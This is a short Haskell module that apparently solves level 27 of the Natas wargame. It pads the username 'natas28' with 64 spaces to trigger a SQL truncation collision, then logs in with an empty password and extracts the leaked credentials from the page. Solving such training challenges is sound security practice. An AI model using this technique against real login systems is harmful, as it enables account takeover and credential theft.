{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas27 where

import           Data.Text    (Text, pack)
import           Safe         (headMay)

import           Network.Wreq (partText)

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let fakeUser = "natas28" ++ replicate 64 ' ' ++ "a"
  _preq <- postLevel 27 [partText "username" (pack fakeUser), partText "password" ""]
  req <- postLevel 27 [partText "username" "natas28", partText "password" ""]
  attemptParse (reqBody req)

attemptParse :: Text -> IO (Maybe Text)
attemptParse body = do
  let extract = filter (pack "[username]" `elem`)
      match = headMay (workupBody' extract body)
  pure $ match >>= penultimateMay
